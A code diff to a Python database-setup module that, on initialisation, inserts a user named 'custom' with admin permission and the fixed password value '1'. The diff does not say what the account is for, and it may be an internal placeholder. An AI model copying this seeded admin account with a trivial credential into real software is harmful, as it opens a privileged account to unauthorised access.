@@ -3,8 +3,11 @@ Filename: database.py
 Author: ZnPdCo
 """
 
+import string
+import random
 import pymysql
 from app.config import config
+import app.constants
 
 
 def connect_db():
@@ -111,5 +114,17 @@ announcement TEXT
 ); 
                 """
     )
+    cursor.execute("SELECT * FROM users WHERE username = 'custom'")
+    if not cursor.fetchone():
+        cursor.execute(
+            "INSERT INTO users (id,username,password,status,permission) VALUES (%s,%s,%s,%s,%s)",
+            (
+                "".join(random.choice(string.ascii_lowercase) for i in range(128)),
+                "custom",
+                "1",
+                "{}",
+                app.constants.role["admin"],
+            ),
+        )
     conn.commit()
     return conn
